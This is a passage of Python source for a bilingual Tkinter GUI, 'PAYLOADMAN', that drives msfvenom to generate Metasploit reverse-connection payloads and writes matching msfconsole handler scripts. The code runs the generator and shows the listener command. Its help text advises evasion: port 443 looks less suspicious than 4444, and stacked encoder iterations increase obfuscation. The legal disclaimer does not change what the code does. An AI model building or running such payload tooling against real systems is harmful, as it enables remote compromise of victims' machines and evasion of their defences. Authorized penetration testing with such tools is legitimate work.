        payload_path = os.path.join(self.outdir_var.get(), payload_filename)
        handler_path = os.path.join(self.outdir_var.get(), f"HANDLER_{self.output_var.get()}.rc")
        
        # Check if files already exist
        if os.path.exists(payload_path) and not self.keep_var.get():
            if not messagebox.askyesno("Archivo Existe" if self.translator.language == 'es' else "File Exists", 
                                    f"{payload_filename} ya existe. ¿Sobreescribir?" if self.translator.language == 'es' else f"{payload_filename} already exists. Overwrite?"):
                return
        
        # Build and execute command
        cmd = self.build_payload_command(payload_path)
        pretty_cmd = " ".join(shlex.quote(arg) for arg in cmd)
        
        # Update output
        self.output.insert("end", f"[{datetime.now().strftime('%H:%M:%S')}] {self.translator.t('generating')}\n")
        self.output.insert("end", f"Command: {pretty_cmd}\n")
        self.output.insert("end", "-" * 80 + "\n")
        
        self.generation_status.config(text=self.translator.t('generating'), fg=self.colors['warning'])
        self.root.update()
        
        try:
            # Execute msfvenom
            if self.verbose_var.get():
                self.output.insert("end", f"Executing: msfvenom\n")
                self.output.see("end")
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if result.returncode == 0:
                # Write handler
                handler_content = self.write_handler_rc(handler_path)
                
                # Update output with success
                self.output.insert("end", f"\nSUCCESS: {self.translator.t('success')}\n")
                self.output.insert("end", f"Payload: {payload_path}\n")
                self.output.insert("end", f"Handler: {handler_path}\n")
                self.output.insert("end", f"Size: {os.path.getsize(payload_path):,} bytes\n")
                
                self.output.insert("end", "\n" + "="*80 + "\n")
                self.output.insert("end", "TO START LISTENER:\n")
                self.output.insert("end", f"msfconsole -r {os.path.basename(handler_path)}\n")
                
                self.output.insert("end", "\n" + "="*80 + "\n")
                self.output.insert("end", "HANDLER CONTENT (OPTIMIZED FOR STABILITY):\n")
                self.output.insert("end", handler_content)
                
                self.generation_status.config(text=self.translator.t('success'), fg=self.colors['success'])
                
                # Show success dialog
                if self.translator.language == 'es':
                    messagebox.showinfo("Éxito", 
                                    f"Payload generado exitosamente!\n\n"
                                    f"Payload: {payload_filename}\n"
                                    f"Handler: HANDLER_{self.output_var.get()}.rc\n\n"
                                    f"Para iniciar el listener:\n"
                                    f"msfconsole -r HANDLER_{self.output_var.get()}.rc\n\n"
                                    f"NOTA: Handler optimizado para estabilidad")
                else:
                    messagebox.showinfo("Success", 
                                    f"Payload generated successfully!\n\n"
                                    f"Payload: {payload_filename}\n"
                                    f"Handler: HANDLER_{self.output_var.get()}.rc\n\n"
                                    f"To start listener:\n"
                                    f"msfconsole -r HANDLER_{self.output_var.get()}.rc\n\n"
                                    f"NOTE: Handler optimized for stability")
            else:
                self.output.insert("end", f"\nERROR: {self.translator.t('failed')}\n")
                self.output.insert("end", f"STDOUT: {result.stdout}\n")
                self.output.insert("end", f"STDERR: {result.stderr}\n")
                self.generation_status.config(text=self.translator.t('failed'), fg=self.colors['danger'])
                
                # Check if it's encoder error
                if "undefined local variable or method" in result.stderr or "zutto_dekiru" in result.stderr:
                    error_msg = "ERROR: El encoder seleccionado es incompatible con este payload.\n"
                    error_msg += "Recomendado: Usar x64/xor o x64/xor_dynamic en su lugar."
                    messagebox.showerror("Error de Encoder" if self.translator.language == 'es' else "Encoder Error", 
                                    error_msg)
                else:
                    if self.translator.language == 'es':
                        messagebox.showerror("Error", 
                                        f"Ejecución de msfvenom falló!\n\n"
                                        f"Error: {result.stderr[:200]}")
                    else:
                        messagebox.showerror("Error", 
                                        f"msfvenom execution failed!\n\n"
                                        f"Error: {result.stderr[:200]}")
            
        except subprocess.TimeoutExpired:
            self.output.insert("end", f"\nERROR: {self.translator.t('timeout')}\n")
            self.generation_status.config(text=self.translator.t('timeout'), fg=self.colors['danger'])
            if self.translator.language == 'es':
                messagebox.showerror("Timeout", "El comando msfvenom expiró después de 60 segundos")
            else:
                messagebox.showerror("Timeout", "msfvenom command timed out after 60 seconds")
        
        except FileNotFoundError:
            self.output.insert("end", f"\nERROR: {self.translator.t('not_found')}\n")
            self.output.insert("end", "Asegúrate de que Metasploit Framework esté instalado\n" if self.translator.language == 'es' else "Make sure Metasploit Framework is installed\n")
            self.output.insert("end", "y msfvenom esté en tu PATH\n" if self.translator.language == 'es' else "and msfvenom is in your PATH\n")
            self.generation_status.config(text=self.translator.t('not_found'), fg=self.colors['danger'])
            
            if self.translator.language == 'es':
                messagebox.showerror("msfvenom no encontrado", 
                                "Comando msfvenom no encontrado!\n\n"
                                "Instala Metasploit Framework:\n"
                                "• Kali Linux: Ya instalado\n"
                                "• Ubuntu: sudo apt install metasploit-framework\n"
                                "• Windows: Instalar desde rapid7.com")
            else:
                messagebox.showerror("msfvenom not found", 
                                "msfvenom command not found!\n\n"
                                "Install Metasploit Framework:\n"
                                "• Kali Linux: Already installed\n"
                                "• Ubuntu: sudo apt install metasploit-framework\n"
                                "• Windows: Install from rapid7.com")
        
        except Exception as e:
            self.output.insert("end", f"\nERROR INESPERADO: {str(e)}\n")
            self.generation_status.config(text=self.translator.t('failed'), fg=self.colors['danger'])
            messagebox.showerror("Error", f"Error inesperado: {str(e)}")
        
        finally:
            self.output.see("end")

    def copy_command(self):
        try:
            cmd = self.build_payload_command("/tmp/payload")
            pretty_cmd = " ".join(shlex.quote(arg) for arg in cmd)
            
            self.root.clipboard_clear()
            self.root.clipboard_append(pretty_cmd)
            
            self.update_status("Comando copiado al portapapeles" if self.translator.language == 'es' else "Command copied to clipboard")
            messagebox.showinfo("Copiado" if self.translator.language == 'es' else "Copied", 
                              "Comando copiado al portapapeles" if self.translator.language == 'es' else "Command copied to clipboard")
        except Exception as e:
            messagebox.showerror("Error", f"No se pudo copiar el comando: {str(e)}" if self.translator.language == 'es' else f"Could not copy command: {str(e)}")

    def clear_output(self):
        self.output.delete("1.0", tk.END)
        self.generation_status.config(text="")
        self.update_status("Salida limpia" if self.translator.language == 'es' else "Output cleared")

    def show_handler_content(self):
        if not self.payload_var.get() or not self.ip_var.get():
            messagebox.showwarning("Incompleto" if self.translator.language == 'es' else "Incomplete", 
                                 "Completa payload y LHOST primero" if self.translator.language == 'es' else "Please fill in payload and LHOST first")
            return
        
        handler_content = self.write_handler_rc("/tmp/handler_preview.rc")
        
        win = tk.Toplevel(self.root)
        win.title(self.translator.t('handler_config'))
        win.geometry("700x500")
        win.configure(bg="#162233")
        win.transient(self.root)
        win.resizable(True, True)
        
        tk.Label(win, text=self.translator.t('handler_config'), 
                bg="#336699", fg="white", 
                font=("Helvetica", 12, "bold")).grid(row=0, column=0, sticky="ew", pady=(0, 10))
        
        txt = scrolledtext.ScrolledText(win, wrap="word", 
                                       bg="#0b1220", fg="#e5e7eb", 
                                       font=("Consolas", 10))
        txt.grid(row=1, column=0, sticky="nsew", padx=10, pady=10)
        
        win.rowconfigure(1, weight=1)
        win.columnconfigure(0, weight=1)
        
        txt.insert("1.0", handler_content)
        txt.configure(state="disabled")
        
        tk.Button(win, text=self.translator.t('copy_to_clipboard'), 
                 command=lambda: self.copy_handler_content(handler_content, win),
                 bg="#336699", fg="white", padx=20).grid(row=2, column=0, pady=(0, 10))

    def copy_handler_content(self, content, window):
        self.root.clipboard_clear()
        self.root.clipboard_append(content)
        messagebox.showinfo("Copiado" if self.translator.language == 'es' else "Copied", 
                          "Contenido copiado al portapapeles" if self.translator.language == 'es' else "Content copied to clipboard", 
                          parent=window)

    def show_general_help(self, event=None):
        if self.translator.language == 'es':
            help_text = """PAYLOADMAN v1.0
══════════════════════════════════════════════

ATAJOS DE TECLADO:
• F1: Mostrar esta ayuda
• Ctrl+G: Generar payload
• Ctrl+Q: Salir de la aplicación

INICIO RÁPIDO:
1. Selecciona plataforma (Windows, Linux, etc.)
2. Elige tipo de payload
3. Ingresa tu IP (LHOST) y puerto (LPORT)
4. Configura opciones avanzadas si es necesario
5. Haz clic en 'Generar Payload y Handler'

CONSEJOS:
• Usa 'Detectar IP Local' para redes internas
• El puerto 443 es menos sospechoso que 4444
• Múltiples iteraciones de encoder aumentan la ofuscación
• Prueba payloads en entornos aislados

ADVERTENCIA LEGAL:
Esta herramienta es SOLO para pruebas de seguridad AUTORIZADAS.
Siempre obtén la autorización apropiada antes de realizar pruebas.
El autor no se hace responsable del uso indebido de esta herramienta.

══════════════════════════════════════════════
Solo para fines educativos."""
        else:
            help_text = """PAYLOADMAN v1.0
══════════════════════════════════════════════

KEYBOARD SHORTCUTS:
• F1: Show this help
• Ctrl+G: Generate payload
• Ctrl+Q: Quit application

QUICK START:
1. Select platform (Windows, Linux, etc.)
2. Choose payload type
3. Enter your IP (LHOST) and port (LPORT)
4. Configure advanced options if needed
5. Click 'Generate Payload & Handler'

TIPS:
• Use 'Detect Local IP' for internal networks
• Port 443 is less suspicious than 4444
• Multiple encoder iterations increase obfuscation
• Test payloads in isolated environments

LEGAL WARNING:
This tool is for AUTHORIZED security testing only.
Always obtain proper authorization before testing.
The author is not responsible for any misuse of this tool.

══════════════════════════════════════════════
For educational purposes only."""
        
        show_help(self.translator.t('general_help'), help_text, self.root)

    def update_status(self, message):
        self.status_label.config(text=f"Estado: {message}" if self.translator.language == 'es' else f"Status: {message}")
        self.root.after(5000, lambda: self.status_label.config(text=self.translator.t('footer_disclaimer')))

def main():
    root = tk.Tk()
    
    # Check if msfvenom is available
    try:
        subprocess.run(["msfvenom", "--version"], capture_output=True, timeout=2)
    except (subprocess.TimeoutExpired, FileNotFoundError):
        response = messagebox.askyesno("msfvenom no encontrado", 
                                      "Comando msfvenom no encontrado en PATH.\n"
                                      "Alguna funcionalidad puede estar limitada.\n\n"
                                      "¿Continuar de todas formas?")
        if not response:
            return
    
    # Language selection dialog
    def select_language():
        lang_dialog = tk.Toplevel(root)
        lang_dialog.title("Seleccionar Idioma / Select Language")
        lang_dialog.geometry("400x200")
        lang_dialog.configure(bg="#162233")
        lang_dialog.transient(root)
        lang_dialog.grab_set()
        
        tk.Label(lang_dialog, text="Selecciona tu idioma / Select your language:", 
                bg="#162233", fg="white", font=("Helvetica", 12)).pack(pady=30)
        
        lang_var = tk.StringVar(value="es")
        
        frame = tk.Frame(lang_dialog, bg="#162233")
        frame.pack(pady=20)
        
        tk.Radiobutton(frame, text="Español", value="es", variable=lang_var,
                      bg="#162233", fg="white", selectcolor="#336699").pack(side="left", padx=20)
        tk.Radiobutton(frame, text="English", value="en", variable=lang_var,
                      bg="#162233", fg="white", selectcolor="#336699").pack(side="left", padx=20)
        
        def set_language():
            lang_dialog.selected_language = lang_var.get()
            lang_dialog.destroy()
        
        tk.Button(lang_dialog, text="OK", command=set_language,
                 bg="#336699", fg="white", padx=30).pack(pady=20)
        
        root.wait_window(lang_dialog)
        return getattr(lang_dialog, 'selected_language', 'es')
    
    language = select_language()
    
    app = PayloadManGUI(root, language)
    root.mainloop()

if __name__ == "__main__":
    main()